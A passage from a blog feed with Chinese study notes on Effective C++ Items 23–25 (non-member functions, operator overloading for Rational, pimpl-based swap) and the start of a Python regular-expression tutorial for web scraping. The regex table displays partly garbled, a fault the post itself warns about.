class="title">clearBrowser</span><span class="params">(WebBrowser&amp; wb)</span></span>;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>namespace 和 class的区别：</p><p>from GPT-3.5</p><ol><li><strong>Namespace（命名空间）</strong>：<ul><li><code>namespace</code> 具有全局范围，可以跨越多个源文件。</li><li>可以在不同的源文件中使用 <code>namespace</code> 关键字来定义相同的命名空间，并且这些定义会被<code>合并成一个命名空间</code>。</li><li>例如，可以在一个头文件中定义命名空间，然后在多个源文件中包含该头文件并使用该命名空间中的名称。</li></ul></li><li><strong>Class（类）</strong>：<ul><li><code>class</code> 在单个源文件中定义，并且一般情况下不会跨越多个源文件。</li><li>通常情况下，<code>类的定义（包括成员变量和成员函数的实现）位于头文件中，而方法的实现（定义）则位于源文件中</code>。</li><li>可以在多个源文件中包含相同的类声明（即头文件），但每个源文件中只能有一个类的定义（通常是实现部分）。</li></ul></li></ol></blockquote><ul><li>通过<code>using namespace std;</code>跳转到定义即可看到标准库是由各个定义于不同头文件的std组成，每个头文件定义了std的某些基能。当包含了对应的头文件，命名空间会合并命名空间。</li><li>这样这允许客户只对他们所用的那一小部分系统形成编译相依（见条款31, 其中讨论降低编译依存性的其他做法）</li></ul><h4 id="请记住-5"><a href="#请记住-5" class="headerlink" title="请记住"></a>请记住</h4><ul><li>宁可拿<code>non-member non-friend</code>函数替换<code>member</code> 函数。</li></ul><h3 id="24-Declare-non-member-functions-when-type-conversions-should-apply-to-all-parameters"><a href="#24-Declare-non-member-functions-when-type-conversions-should-apply-to-all-parameters" class="headerlink" title="24.  Declare non-member functions when type conversions should apply to all parameters."></a>24.  Declare non-member functions when type conversions should apply to all parameters.</h3><p>当在类内重载Rational运算符时，我们不能将所有参数都隐式转化为Rational对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Rational</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Rational</span>(<span class="type">int</span> numerator = <span class="number">0</span>,        <span class="comment">// ctor is deliberately not explicit;</span></span><br><span class="line">           <span class="type">int</span> denominator = <span class="number">1</span>);     <span class="comment">// allows implicit int-to-Rational</span></span><br><span class="line">                                     <span class="comment">// conversions</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">numerator</span><span class="params">()</span> <span class="type">const</span></span>;             <span class="comment">// accessors for numerator and</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">denominator</span><span class="params">()</span> <span class="type">const</span></span>;           <span class="comment">// denominator — see Item 22</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rational</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> <span class="type">const</span> Rational <span class="keyword">operator</span>*(<span class="type">const</span> Rational&amp; rhs) <span class="type">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Rational result = oneHalf * oneEighth;            <span class="comment">// fine</span></span><br><span class="line"></span><br><span class="line">result = result * oneEighth;                      <span class="comment">// fine</span></span><br><span class="line"></span><br><span class="line">result = oneHalf * <span class="number">2</span>; <span class="comment">// fine实际：result = oneHalf.operator*(2); </span></span><br><span class="line"></span><br><span class="line">result = <span class="number">2</span> * oneHalf; <span class="comment">// error!实际：result = 2.operator*(oneHalf);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此我们可以使用上一节的知识采用非成员函数去解决这一问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Rational <span class="keyword">operator</span>*(<span class="type">const</span> Rational&amp; lhs, <span class="type">const</span> Rational&amp; rhs)    </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Rational</span>(lhs.<span class="built_in">numerator</span>() * rhs.<span class="built_in">numerator</span>(),</span><br><span class="line">                  lhs.<span class="built_in">denominator</span>() * rhs.<span class="built_in">denominator</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="请记住-6"><a href="#请记住-6" class="headerlink" title="请记住"></a>请记住</h4><ul><li>如果你需要为某个函数的所有参数（包括被this 指针所指的那个隐喻参数）进行类型转换，那么这个函数必须是个<code>non-member</code>。</li></ul><h3 id="25-Consider-support-for-a-non-throwing-swap"><a href="#25-Consider-support-for-a-non-throwing-swap" class="headerlink" title="25. Consider support for a non-throwing swap."></a>25. Consider support for a non-throwing swap.</h3><ul><li>swap函数是<code>异常安全性编程的脊梁</code></li></ul><h4 id="swap的典型实现"><a href="#swap的典型实现" class="headerlink" title="swap的典型实现"></a>swap的典型实现</h4><p>需要类型T支持<code>拷贝构造函数</code>和<code>copy assignment</code>操作符</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;          <span class="comment">// typical implementation of std::swap;</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(T&amp; a, T&amp; b)</span>         <span class="comment">// swaps a&#x27;s and b&#x27;s values</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">temp</span><span class="params">(a)</span></span>;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用pimpl手法"><a href="#使用pimpl手法" class="headerlink" title="使用pimpl手法"></a>使用pimpl手法</h4><p>这样我们只需要交换两个对象的指针即可实现swap</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WidgetImpl</span> &#123;                          <span class="comment">// class for Widget data;</span></span><br><span class="line"><span class="keyword">public</span>:                                     <span class="comment">// details are unimportant</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> a, b, c;                              <span class="comment">// possibly lots of data —</span></span><br><span class="line">  std::vector&lt;<span class="type">double</span>&gt; v;                    <span class="comment">// expensive to copy!</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span> &#123;                              <span class="comment">// class using the pimpl idiom</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Widget</span>(<span class="type">const</span> Widget&amp; rhs);</span><br><span class="line"></span><br><span class="line">  Widget&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Widget&amp; rhs)      <span class="comment">// to copy a Widget, copy its</span></span><br><span class="line">  &#123;                                         <span class="comment">// WidgetImpl object. For</span></span><br><span class="line">   ...                                      <span class="comment">// details on implementing</span></span><br><span class="line">   *pImpl = *(rhs.pImpl);                   <span class="comment">// operator= in general,</span></span><br><span class="line">   ...                                      <span class="comment">// see Items 10, 11, and 12.</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  WidgetImpl *pImpl;                         <span class="comment">// ptr to object with this</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="将std-swap针对Widget特化"><a href="#将std-swap针对Widget特化" class="headerlink" title="将std::swap针对Widget特化"></a>将std::swap针对Widget特化</h4><p>通常我们不能修改std命名空间内的任何东西，但是我们可以为标准templates制造<code>特化版本</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span> &#123;                     <span class="comment">// same as above, except for the</span></span><br><span class="line"><span class="keyword">public</span>:                            <span class="comment">// addition of the swap mem func</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Widget&amp; other)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> std::swap;               <span class="comment">// the need for this declaration</span></span><br><span class="line">                                   <span class="comment">// is explained later in this Item</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">swap</span>(pImpl, other.pImpl);      <span class="comment">// to swap Widgets, swap their</span></span><br><span class="line">  &#125;                                <span class="comment">// pImpl pointers</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">template</span>&lt;&gt;                       <span class="comment">// revised specialization of</span></span><br><span class="line">  <span class="type">void</span> <span class="built_in">swap</span>&lt;Widget&gt;(Widget&amp; a,     <span class="comment">// std::swap</span></span><br><span class="line">                    Widget&amp; b)</span><br><span class="line">  &#123;</span><br><span class="line">    a.<span class="built_in">swap</span>(b);                     <span class="comment">// to swap Widgets, call their</span></span><br><span class="line">  &#125;                                <span class="comment">// swap member function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种做法不只能够通过编译，还与STL 容器有一致性，因为所有STL 容器也都提供有<code>public swap 成员函数</code>和<code>std::swap 特化版本</code>（用以调用前者）。</p><h4 id="通过non-member-swap调用member-swap"><a href="#通过non-member-swap调用member-swap" class="headerlink" title="通过non-member swap调用member swap"></a>通过non-member swap调用member swap</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> WidgetStuff &#123;</span><br><span class="line">  ...                                     <span class="comment">// templatized WidgetImpl, etc.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;                    <span class="comment">// as before, including the swap</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Widget</span> &#123; ... &#125;;                   <span class="comment">// member function</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;                    <span class="comment">// non-member swap function;</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Widget&lt;T&gt;&amp; a,                 <span class="comment">// not part of the std namespace</span></span></span></span><br><span class="line"><span class="params"><span class="function">            Widget&lt;T&gt;&amp; b)</span>                                         </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    a.<span class="built_in">swap</span>(b);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C++的名称查找法则(name lookup rules; 更具体地说是所谓argument-dependent lookup 或Koenig lookup 法则）会找到WidgetStuff 内的Widget 专属版本。</p><h4 id="选择调用合适的swap函数"><a href="#选择调用合适的swap函数" class="headerlink" title="选择调用合适的swap函数"></a>选择调用合适的swap函数</h4><p>如果 T 专用版本存在，你希望调用它，如果它不存在，就回过头来调用 std 中的通用版本。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doSomething</span><span class="params">(T&amp; obj1, T&amp; obj2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">using</span> std::swap;           <span class="comment">// make std::swap available in this function</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">swap</span>(obj1, obj2);          <span class="comment">// call the best swap for objects of type T</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意swap函数不能这样调用这将强制编译器只考虑<code>std 中的 swap（包括任何模板特化）</code>，因此排除了定义在别处的更为适用的 T 专用版本被调用的可能性。这也就是为你的<code>类完全地特化 std::swap</code>很重要的原因：它使得以这种被误导的方式写出的代码可以用到类型专用的 swap 实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::<span class="built_in">swap</span>(obj1, obj2); <span class="comment">// the wrong way to call swap</span></span><br></pre></td></tr></table></figure><h4 id="swap总结"><a href="#swap总结" class="headerlink" title="swap总结"></a>swap总结</h4><p><code>首先</code>，如果swap 的缺省实现码对你的class 或class template 提供可接受的效率，你不需要额外做任何事。任何尝试置换(swap) 那种对象的人都会取得缺省版本，而那将有良好的运作。<br><code>其次</code>，如果swap 缺省实现版的效率不足（那几乎总是意味你的class 或template使用了某种pimpl 手法），试着做以下事情：</p><ol><li>提供一个<code>public swap 成员函数</code>，让它高效地置换你的类型的两个对象值，这个函数绝不该抛出异常。</li><li>在你的<code>class</code> 或<code>template</code>所在的<code>命名空间</code>内提供一个<code>non-member swap</code>, 并令它调用上述swap 成员函数。</li><li>如果你正编写一个<code>class （而非class template)</code> ，为你的<code>class特化std::swap</code>。并令它调用你的<code>swap 成员函数</code>。</li></ol><p>最后，如果你调用swap, 请确定包含一个<code>using 声明式</code>，以便让<code>std: :swap 在你的函数内</code>曝光可见，然后不加任何namespace 修饰符，<code>赤裸裸地调用swap</code>。</p><h4 id="请记住-7"><a href="#请记住-7" class="headerlink" title="请记住"></a>请记住</h4><ul><li>当std:: swap 对你的类型效率不高时，提供一个swap 成员函数，并确定这个函数不抛出异常。</li><li>如果你提供一个member swap, 也该提供一个non-member swap 用来调用前者。对于classes （而非templates) ，也请特化std: :swap 。</li><li>调用swap 时应针对std:: swap 使用using 声明式，然后调用swap 并且不带任何“命<br>名空间资格修饰”。</li><li>为“用户定义类型”进行std templates 全特化是好的，但千万不要尝试在std 内加入某些对std 而言全新的东西。</li></ul>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫0x2</title>
      <link href="/2024/04/13/python/Python%E7%88%AC%E8%99%AB0x2/"/>
      <url>/2024/04/13/python/Python%E7%88%AC%E8%99%AB0x2/</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫"><a href="#Python爬虫" class="headerlink" title="Python爬虫"></a>Python爬虫</h1><p>[toc]</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>该表格可能出现显示错误，建议直接看课件</p><div class="table-container"><table><thead><tr><th>操作符</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td>.</td><td>表示任何单个字符</td><td></td></tr><tr><td>[]</td><td>字符集，对单个字符给出取值范围</td><td>[abc]表示a、b、c，[a‐z]表示a到z单个字符</td></tr><tr><td><sup><a href="#fn_ " id="reffn_ "> </a></sup></td><td>非字符集，对单个字符给出排除范围</td><td><sup><a href="#fn_abc" id="reffn_abc">abc</a></sup>表示非a或b或c的单个字符</td></tr><tr><td>*</td><td>前一个字符0次或无限次扩展</td><td>abc* 表示ab、abc、abcc、abccc等</td></tr><tr><td>+</td><td>前一个字符1次或无限次扩展</td><td>abc+ 表示abc、abcc、abccc等</td></tr><tr><td>?</td><td>? 前一个字符0次或1次扩展</td><td>abc? 表示ab、abc</td></tr><tr><td>\</td><td></td><td>左右表达式任意一个abc</td><td>def 表示abc、def</td></tr><tr><td>{m}</td><td>扩展前一个字符m次</td><td>ab{2}c表示abbc</td></tr><tr><td>{m,n}</td><td>扩展前一个字符m至n次（含n）</td><td>ab{1,2}c表示abc、abbc</td></tr><tr><td>^</td><td>匹配字符串开头</td><td>^abc表示abc且在一个字符串的开头</td></tr><tr><td>$</td><td>$匹配字符串结尾</td><td>$abc表示abc且在一个字符串的结尾</td></tr><tr><td>()</td><td>分组标记，内部只能使用\</td><td>操作符</td><td>(abc)表示abc，(abc\</td><td>def)表示abc、def</td></tr><tr><td>\d</td><td>数字，等价于[0‐9]</td><td></td></tr><tr><td>\w</td><td>单词字符，等价于[A‐Za‐z0‐9_]</td></tr></tbody></table></div><h4 id="经典正则表达式"><a href="#经典正则表达式" class="headerlink" title="经典正则表达式"></a>经典正则表达式</h4><ul><li><p><code>^[A‐Za‐z]+$</code>        由26个字母组成的字符串</p></li><li><p><code>^[A‐Za‐z0‐9]+$</code>        由26个字母和数字组成的字符串整数形式的字符串</p></li><li><p><code>^‐?\d+$</code>            正整数形式的字符串</p></li><li><p><code>^[0‐9]*[1‐9][0‐9]*$ [1‐9]\d&#123;5&#125; [\u4e00‐\u9fa5]</code>            中国境内邮政编码，6位匹配中文字符</p></li><li><p><code>\d&#123;3&#125;‐\d&#123;8&#125;|\d&#123;4&#125;‐\d&#123;7&#125;</code>            国内电话号码，010‐68913536</p></li></ul><p>​    </p><h4 id="正则表达式主要功能函数"><a href="#正则表达式主要功能函数" class="headerlink" title="正则表达式主要功能函数"></a>正则表达式主要功能函数</h4><ul><li><code>(raw string)</code>原始字符串中，反斜杠（\）不会被解释为转义字符，而是作为普通字符处理。可以通过在字符串前加上 <code>r</code> 或 <code>R</code> 来创建原始字符串。</li></ul><ul><li><code>re.search()</code>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</li><li><code>re.match()</code> 从一个字符串的开始位置起匹配正则表达式，返回match对象</li><li><code>re.findall()</code>搜索字符串，以列表类型返回全部能匹配的子串</li><li><code>re.split()</code> 将一个字符串按照正则表达式匹配结果进行<code>分割</code>，返回<code>列表类型</code></li><li><code>re.finditer()</code>搜索字符串，返回一个匹配结果的<code>迭代类型</code>，每个迭代元素是<code>match对象</code></li><li><code>re.sub()</code> 在一个字符串中<code>替换所有匹配正则表达式的子串</code>，返回替换后的字符串</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.search() 在字符串中搜索匹配的模式，并返回第一个匹配对象</span></span><br><span class="line">search = re.search(<span class="string">r&#x27;[1-9]\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> search:</span><br><span class="line">    <span class="built_in">print</span>(search.group(<span class="number">0</span>))  <span class="comment"># 打印匹配到的结果</span></span><br><span class="line"><span class="comment"># 输出结果：10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.match() 在字符串的开头匹配模式，并返回匹配对象</span></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;[1-9]\d&#123;4&#125;&#x27;</span>, <span class="string">&#x27;100081 BIT&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="keyword">match</span>.group(<span class="number">0</span>))  <span class="comment"># 打印匹配到的结果</span></span><br><span class="line"><span class="comment"># 输出结果：10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.findall() 在字符串中查找所有匹配的模式，并返回一个包含所有匹配字符串的列表</span></span><br><span class="line">findall = re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084 123123&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> findall:</span><br><span class="line">    <span class="built_in">print</span>(findall)  <span class="comment"># 打印所有匹配到的结果</span></span><br><span class="line"><span class="comment"># 输出结果：[&#x27;100081&#x27;, &#x27;100084&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.split() 将字符串分割成多个部分，返回一个分割后的列表</span></span><br><span class="line">split = re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084 TAB123&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> split:</span><br><span class="line">    <span class="built_in">print</span>(split)  <span class="comment"># 打印分割后的结果</span></span><br><span class="line"><span class="comment"># 输出结果：[&#x27;BIT&#x27;, &#x27; TSU&#x27;, &#x27; TAB123&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.split() 分割字符串，但最多只进行一次分割</span></span><br><span class="line">split = re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084 TAB123&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> split:</span><br><span class="line">    <span class="built_in">print</span>(split)  <span class="comment"># 打印分割后的结果</span></span><br><span class="line"><span class="comment"># 输出结果：[&#x27;BIT&#x27;, &#x27; TSU100084 TAB123&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.finditer() 在字符串中查找所有匹配的模式，并返回一个迭代器</span></span><br><span class="line"><span class="comment"># 遍历迭代器并打印匹配到的结果</span></span><br><span class="line"><span class="keyword">for</span> finditer <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084 TAB123&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> finditer:</span><br><span class="line">        <span class="built_in">print</span>(finditer.group(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 输出结果：</span></span><br><span class="line"><span class="comment"># 100081</span></span><br><span class="line"><span class="comment"># 100084</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Re库的两种用法"><a href="#Re库的两种用法" class="headerlink" title="Re库的两种用法"></a>Re库的两种用法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rst = re.search(<span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">函数式用法：一次性操作</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pat = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rst = pat.search(<span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">面向对象用法：编译后的多次操作</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h4><p><code>Match对象</code>是一次匹配的结果，包含匹配的很多信息</p><p>属性：</p><ul><li><code>.string</code> 待匹配的文本</li><li><code>.re</code> 匹配时使用的patter对象（正则表达式）</li><li><code>.pos</code> 正则表达式搜索文本的开始位置</li><li><code>endpos</code> 正则表达式搜索文本的结束位置</li></ul><p>方法：</p><ul><li><code>.group(0)</code> 获得匹配后的字符串</li><li><code>.start()</code>匹配字符串在原始字符串的开始位置</li><li><code>.end()</code>匹配字符串在原始字符串的结束位置</li><li><code>.span()</code> 返回(.start(), .end())</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string = <span class="string">&quot;BIT100081 TSU100084&quot;</span></span><br><span class="line">m = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, string)</span><br><span class="line"><span class="built_in">print</span>(m.string)</span><br><span class="line"><span class="built_in">print</span>(m.re)</span><br><span class="line"><span class="comment">#BIT100081 TSU100084</span></span><br><span class="line"><span class="comment">#re.compile(&#x27;[1-9]\\d&#123;5&#125;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(string))</span><br><span class="line"><span class="built_in">print</span>(m.pos)</span><br><span class="line"><span class="built_in">print</span>(m.endpos)</span><br><span class="line"><span class="comment">#19</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#19</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#100081</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m.start())</span><br><span class="line"><span class="built_in">print</span>(m.end())</span><br><span class="line"><span class="built_in">print</span>(m.span())</span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 9</span></span><br><span class="line"><span class="comment"># (3, 9)</span></span><br></pre></td></tr></table></figure><h4 id="贪婪匹配与最小匹配"><a href="#贪婪匹配与最小匹配" class="headerlink" title="贪婪匹配与最小匹配"></a>贪婪匹配与最小匹配</h4><ul><li>默认贪婪匹配，即匹配最长字串</li><li>最小匹配，最短字串</li></ul><ul><li><code>*?</code> 前一个字符0次或无限次扩展，最小匹配</li><li><code>+?</code> 前一个字符1次或无限次扩展，最小匹配</li><li><code>??</code>前一个字符0次或1次扩展，最小匹配</li><li><code>&#123;m,n&#125;?</code> 扩展前一个字符m至n次（含n），最小匹配</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span 